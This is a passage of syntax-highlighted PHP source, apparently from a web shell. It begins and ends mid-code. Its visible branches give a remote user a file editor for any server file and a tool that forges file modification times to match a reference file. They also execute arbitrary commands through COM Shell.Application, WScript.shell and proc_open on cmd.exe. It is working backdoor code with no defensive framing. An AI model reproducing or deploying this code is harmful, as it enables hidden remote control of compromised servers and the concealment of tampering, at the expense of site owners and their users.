<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formfooter(</span>);
}<span style="color: #999999; font-style: italic;">//</span><span style="color: #999999; font-style: italic;">end eval</span>

<span style="color: #99cc99;">elseif</span> ($<span style="color: #ffcc66;">action</span> == <span style="color: #66cccc;">'editfile'</span>) {
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(<span style="color: #cccccc; background-color: #2d2d2d;">file_exists(</span>$<span style="color: #ffcc66;">opfile</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">fp</span>=@<span style="color: #cccccc; background-color: #2d2d2d;">fopen(</span>$<span style="color: #ffcc66;">opfile</span>,<span style="color: #66cccc;">'r'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">contents</span>=@<span style="color: #cccccc; background-color: #2d2d2d;">fread(</span>$<span style="color: #ffcc66;">fp</span>, <span style="color: #cccccc; background-color: #2d2d2d;">filesize(</span>$<span style="color: #ffcc66;">opfile</span>));
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   @<span style="color: #cccccc; background-color: #2d2d2d;">fclose(</span>$<span style="color: #ffcc66;">fp</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">contents</span>=<span style="color: #cccccc; background-color: #2d2d2d;">htmlspecialchars(</span>$<span style="color: #ffcc66;">contents</span>);
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formhead(array(</span><span style="color: #66cccc;">'title'</span>=&gt;<span style="color: #66cccc;">'Create / Edit File'</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'action'</span>,<span style="color: #66cccc;">'file'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'dir'</span>,$<span style="color: #ffcc66;">nowpath</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makeinput(array(</span><span style="color: #66cccc;">'title'</span>=&gt;<span style="color: #66cccc;">'Current File (import new file name and new file)'</span>,<span style="color: #66cccc; text-decoration: underline;">'name'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #66cccc; text-decoration: underline;">'editfilename'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'value'</span><span style="text-decoration: underline;">=&gt;$</span><span style="color: #ffcc66; text-decoration: underline;">opfile</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">maketext(array(</span><span style="color: #66cccc;">'title'</span>=&gt;<span style="color: #66cccc;">'File Content'</span>,<span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'filecontent'</span>,<span style="color: #66cccc;">'value'</span>=&gt;$<span style="color: #ffcc66;">conte</span><span style="color: #ffcc66; text-decoration: underline;">nts</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formfooter(</span>);

<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">goback(</span>);

}<span style="color: #999999; font-style: italic;">//</span><span style="color: #999999; font-style: italic;">end editfile</span>

<span style="color: #99cc99;">elseif</span> ($<span style="color: #ffcc66;">action</span> == <span style="color: #66cccc;">'newtime'</span>) {
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">opfilemtime</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">filemtime(</span>$<span style="color: #ffcc66;">opfile</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #999999; font-style: italic;">//</span><span style="color: #999999; font-style: italic;">$time = strtotime("$year-$month-$day $hour:$minute:$second");</span>
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">cachemonth</span> = <span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">'January'</span>=&gt;<span style="color: #cccccc; background-color: #2d2d2d;">1</span>,<span style="color: #66cccc;">'February'</span>=&gt;<span style="color: #cccccc; background-color: #2d2d2d;">2</span>,<span style="color: #66cccc;">'March'</span>=&gt;<span style="color: #cccccc; background-color: #2d2d2d;">3</span>,<span style="color: #66cccc;">'April'</span>=&gt;<span style="color: #cccccc; background-color: #2d2d2d;">4</span>,<span style="color: #66cccc;">'May'</span>=&gt;<span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">5</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'June'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">6</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'July'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">7</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'August'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">8</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'September'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">9</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'October'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">10</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'November'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">11</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'December'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">12</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formhead(array(</span><span style="color: #66cccc;">'title'</span>=&gt;<span style="color: #66cccc;">'Clone folder/file was last modified time'</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'action'</span>,<span style="color: #66cccc;">'file'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'dir'</span>,$<span style="color: #ffcc66;">nowpath</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makeinput(array(</span><span style="color: #66cccc;">'title'</span>=&gt;<span style="color: #66cccc;">'Alter folder/file'</span>,<span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'curfile'</span>,<span style="color: #66cccc;">'value'</span>=&gt;$<span style="color: #ffcc66;">opf</span><span style="color: #ffcc66; text-decoration: underline;">ile</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'size'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">120</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makeinput(array(</span><span style="color: #66cccc;">'title'</span>=&gt;<span style="color: #66cccc;">'Reference folder/file (fullpath)'</span>,<span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'tarfile</span><span style="color: #66cccc; text-decoration: underline;">'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'size'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">120</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formfooter(</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formhead(array(</span><span style="color: #66cccc;">'title'</span>=&gt;<span style="color: #66cccc;">'Set last modified'</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'action'</span>,<span style="color: #66cccc;">'file'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'dir'</span>,$<span style="color: #ffcc66;">nowpath</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makeinput(array(</span><span style="color: #66cccc;">'title'</span>=&gt;<span style="color: #66cccc;">'Current folder/file (fullpath)'</span>,<span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'curfile'</span>,<span style="color: #66cccc; text-decoration: underline;">'value'</span><span style="text-decoration: underline;">=&gt;$</span><span style="color: #ffcc66; text-decoration: underline;">opfile</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'size'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">120</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;p&gt;year:'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makeinput(array(</span><span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'year'</span>,<span style="color: #66cccc;">'value'</span>=&gt;<span style="color: #cccccc; background-color: #2d2d2d;">date(</span><span style="color: #66cccc;">'Y'</span>,$<span style="color: #ffcc66;">opfilemtime</span>),<span style="color: #66cccc;">'size'</span>=&gt;<span style="color: #cccccc; background-color: #2d2d2d;">4</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'month:'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makeinput(array(</span><span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'month'</span>,<span style="color: #66cccc;">'value'</span>=&gt;<span style="color: #cccccc; background-color: #2d2d2d;">date(</span><span style="color: #66cccc;">'m'</span>,$<span style="color: #ffcc66;">opfilemtime</span>),<span style="color: #66cccc;">'size'</span>=&gt;<span style="color: #cccccc; background-color: #2d2d2d;">2</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'day:'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makeinput(array(</span><span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'day'</span>,<span style="color: #66cccc;">'value'</span>=&gt;<span style="color: #cccccc; background-color: #2d2d2d;">date(</span><span style="color: #66cccc;">'d'</span>,$<span style="color: #ffcc66;">opfilemtime</span>),<span style="color: #66cccc;">'size'</span>=&gt;<span style="color: #cccccc; background-color: #2d2d2d;">2</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'hour:'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makeinput(array(</span><span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'hour'</span>,<span style="color: #66cccc;">'value'</span>=&gt;<span style="color: #cccccc; background-color: #2d2d2d;">date(</span><span style="color: #66cccc;">'H'</span>,$<span style="color: #ffcc66;">opfilemtime</span>),<span style="color: #66cccc;">'size'</span>=&gt;<span style="color: #cccccc; background-color: #2d2d2d;">2</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'minute:'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makeinput(array(</span><span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'minute'</span>,<span style="color: #66cccc;">'value'</span>=&gt;<span style="color: #cccccc; background-color: #2d2d2d;">date(</span><span style="color: #66cccc;">'i'</span>,$<span style="color: #ffcc66;">opfilemtime</span>),<span style="color: #66cccc;">'size'</span>=&gt;<span style="color: #cccccc; background-color: #2d2d2d;">2</span>))<span style="text-decoration: underline;">;</span>
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'second:'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makeinput(array(</span><span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'second'</span>,<span style="color: #66cccc;">'value'</span>=&gt;<span style="color: #cccccc; background-color: #2d2d2d;">date(</span><span style="color: #66cccc;">'s'</span>,$<span style="color: #ffcc66;">opfilemtime</span>),<span style="color: #66cccc;">'size'</span>=&gt;<span style="color: #cccccc; background-color: #2d2d2d;">2</span>))<span style="text-decoration: underline;">;</span>
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;/p&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formfooter(</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">goback(</span>);
}<span style="color: #999999; font-style: italic;">//</span><span style="color: #999999; font-style: italic;">end newtime</span>

<span style="color: #99cc99;">elseif</span> ($<span style="color: #ffcc66;">action</span> == <span style="color: #66cccc;">'shell'</span>) {
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (<span style="color: #f2777a; font-weight: bold;">IS_WIN</span> &amp;&amp; <span style="color: #f2777a; font-weight: bold;">IS_COM</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>($<span style="color: #ffcc66;">program</span> &amp;&amp; $<span style="color: #ffcc66;">parameter</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">shell</span>= <span style="color: #99cc99;">new</span> <span style="color: #6699cc;">COM</span>(<span style="color: #66cccc;">'Shell.Application'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">a</span> = $<span style="color: #ffcc66;">shell</span>-&gt;<span style="color: #cccccc; background-color: #2d2d2d;">ShellExecute</span>($<span style="color: #ffcc66;">program</span>,$<span style="color: #ffcc66;">parameter</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">m(</span><span style="color: #66cccc;">'Program run has '</span>.(!$<span style="color: #ffcc66;">a</span> ? <span style="color: #66cccc;">'success'</span> : <span style="color: #66cccc;">'fail'</span>));
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   !$<span style="color: #ffcc66;">program</span> &amp;&amp; $<span style="color: #ffcc66;">program</span> = <span style="color: #66cccc;">'c:\windows\system32\cmd.exe'</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   !$<span style="color: #ffcc66;">parameter</span> &amp;&amp; $<span style="color: #ffcc66;">parameter</span> = <span style="color: #66cccc;">'/c net start &gt; '</span>.<span style="color: #f2777a; font-weight: bold;">SA_ROOT</span>.<span style="color: #66cccc;">'log.txt'</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formhead(array(</span><span style="color: #66cccc;">'title'</span>=&gt;<span style="color: #66cccc;">'Execute Program'</span>));
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'action'</span>,<span style="color: #66cccc;">'shell'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makeinput(array(</span><span style="color: #66cccc;">'title'</span>=&gt;<span style="color: #66cccc;">'Program'</span>,<span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'program'</span>,<span style="color: #66cccc;">'value'</span>=&gt;$<span style="color: #ffcc66;">program</span>,<span style="color: #66cccc;">'</span><span style="color: #66cccc; text-decoration: underline;">newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;p&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makeinput(array(</span><span style="color: #66cccc;">'title'</span>=&gt;<span style="color: #66cccc;">'Parameter'</span>,<span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'parameter'</span>,<span style="color: #66cccc;">'value'</span>=&gt;$<span style="color: #ffcc66;">param</span><span style="color: #ffcc66; text-decoration: underline;">eter</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makeinput(array(</span><span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'submit'</span>,<span style="color: #66cccc;">'class'</span>=&gt;<span style="color: #66cccc;">'bt'</span>,<span style="color: #66cccc;">'type'</span>=&gt;<span style="color: #66cccc;">'submit'</span>,<span style="color: #66cccc;">'value'</span>=<span style="text-decoration: underline;">&gt;</span><span style="color: #66cccc; text-decoration: underline;">'Execute'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;/p&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formfoot(</span>);
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formhead(array(</span><span style="color: #66cccc;">'title'</span>=&gt;<span style="color: #66cccc;">'Execute Command'</span>));
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makehide(</span><span style="color: #66cccc;">'action'</span>,<span style="color: #66cccc;">'shell'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (<span style="color: #f2777a; font-weight: bold;">IS_WIN</span> &amp;&amp; <span style="color: #f2777a; font-weight: bold;">IS_COM</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">execfuncdb</span> = <span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">'phpfunc'</span>=&gt;<span style="color: #66cccc;">'phpfunc'</span>,<span style="color: #66cccc;">'wscript'</span>=&gt;<span style="color: #66cccc;">'wscript'</span>,<span style="color: #66cccc;">'proc_open</span><span style="color: #66cccc; text-decoration: underline;">'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #66cccc; text-decoration: underline;">'proc_open'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makeselect(array(</span><span style="color: #66cccc;">'title'</span>=&gt;<span style="color: #66cccc;">'Use:'</span>,<span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'execfunc'</span>,<span style="color: #66cccc;">'option'</span>=&gt;$<span style="color: #ffcc66;">execfuncd</span><span style="color: #ffcc66; text-decoration: underline;">b</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'selected'</span><span style="text-decoration: underline;">=&gt;$</span><span style="color: #ffcc66; text-decoration: underline;">execfunc</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;p&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makeinput(array(</span><span style="color: #66cccc;">'title'</span>=&gt;<span style="color: #66cccc;">'Command'</span>,<span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'command'</span>,<span style="color: #66cccc;">'value'</span>=&gt;<span style="color: #cccccc; background-color: #2d2d2d;">htmlspecialcha</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">rs(</span><span style="text-decoration: underline;">$</span><span style="color: #ffcc66; text-decoration: underline;">command</span><span style="text-decoration: underline;">)));</span>
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">makeinput(array(</span><span style="color: #66cccc;">'name'</span>=&gt;<span style="color: #66cccc;">'submit'</span>,<span style="color: #66cccc;">'class'</span>=&gt;<span style="color: #66cccc;">'bt'</span>,<span style="color: #66cccc;">'type'</span>=&gt;<span style="color: #66cccc;">'submit'</span>,<span style="color: #66cccc;">'value'</span>=&gt;<span style="color: #66cccc;">'Ex</span><span style="color: #66cccc; text-decoration: underline;">ecute'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;/p&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">formfoot(</span>);

<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">command</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;hr width="100%" noshade /&gt;&lt;pre&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">execfunc</span>==<span style="color: #66cccc;">'wscript'</span> &amp;&amp; <span style="color: #f2777a; font-weight: bold;">IS_WIN</span> &amp;&amp; <span style="color: #f2777a; font-weight: bold;">IS_COM</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">wsh</span> = <span style="color: #99cc99;">new</span> <span style="color: #6699cc;">COM</span>(<span style="color: #66cccc;">'WScript.shell'</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">exec</span> = $<span style="color: #ffcc66;">wsh</span>-&gt;<span style="color: #cccccc; background-color: #2d2d2d;">exec</span>(<span style="color: #66cccc;">'cmd.exe /c '</span>.$<span style="color: #ffcc66;">command</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">stdout</span> = $<span style="color: #ffcc66;">exec</span>-&gt;<span style="color: #cccccc; background-color: #2d2d2d;">StdOut</span>();
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">stroutput</span> = $<span style="color: #ffcc66;">stdout</span>-&gt;<span style="color: #cccccc; background-color: #2d2d2d;">ReadAll</span>();
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">echo</span> $<span style="color: #ffcc66;">stroutput</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">elseif</span> ($<span style="color: #ffcc66;">execfunc</span>==<span style="color: #66cccc;">'proc_open'</span> &amp;&amp; <span style="color: #f2777a; font-weight: bold;">IS_WIN</span> &amp;&amp; <span style="color: #f2777a; font-weight: bold;">IS_COM</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">descriptorspec</span> = <span style="color: #cccccc; background-color: #2d2d2d;">array(</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>  <span style="color: #cccccc; background-color: #2d2d2d;">0</span> =&gt; <span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">'pipe'</span>, <span style="color: #66cccc;">'r'</span>),
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>  <span style="color: #cccccc; background-color: #2d2d2d;">1</span> =&gt; <span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">'pipe'</span>, <span style="color: #66cccc;">'w'</span>),
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>  <span style="color: #cccccc; background-color: #2d2d2d;">2</span> =&gt; <span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">'pipe'</span>, <span style="color: #66cccc;">'w'</span>)
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   );
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">process</span> = <span style="color: #cccccc; background-color: #2d2d2d;">proc_open(</span>$<span style="color: #6699cc;">_SERVER</span>[<span style="color: #66cccc;">'COMSPEC'</span>], $<span style="color: #ffcc66;">descriptorspec</span>, $<span style="color: #ffcc66;">pipes</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (<span style="color: #cccccc; background-color: #2d2d2d;">is_resource(</span>$<span style="color: #ffcc66;">process</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">fwrite(</span>$<span style="color: #ffcc66;">pipes</span>[<span style="color: #cccccc; background-color: #2d2d2d;">0</span>], $<span style="color: #ffcc66;">command</span>.<span style="color: #66cccc;">"\r\n"</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">fwrite(</span>$<span style="color: #ffcc66;">pipes</span>[<span style="color: #cccccc; background-color: #2d2d2d;">0</span>], <span style="color: #66cccc;">"exit\r\n"</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">fclose(</span>$<span style="color: #ffcc66;">pipes</span>[<span style="color: #cccccc; background-color: #2d2d2d;">0</span>]);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">while</span> (!<span style="color: #cccccc; background-color: #2d2d2d;">feof(</span>$<span style="color: #ffcc66;">pipes</span>[<span style="color: #cccccc; background-color: #2d2d2d;">1</span>])) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">echo</span> <span style="color: #cccccc; background-color: #2d2d2d;">fgets(</span>$<span style="color: #ffcc66;">pipes</span>[<span style="color: #cccccc; background-color: #2d2d2d;">1</span>], <span style="color: #cccccc; background-color: #2d2d2d;">1024</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
